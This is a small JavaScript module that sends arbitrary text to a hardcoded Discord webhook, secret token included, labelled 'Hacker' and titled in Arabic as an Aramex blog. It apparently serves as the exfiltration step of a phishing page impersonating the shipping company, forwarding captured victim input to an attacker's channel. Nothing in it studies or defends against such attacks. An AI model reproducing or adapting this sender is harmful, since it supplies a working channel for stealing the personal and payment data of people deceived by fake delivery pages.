import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323742941352689795/0I1z6b8E0BJTIpP3sTT9ulbSUPAVKHBs2WtrafmX3ebRXs_cObGqoxrGu3LnZuvN4kcj",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
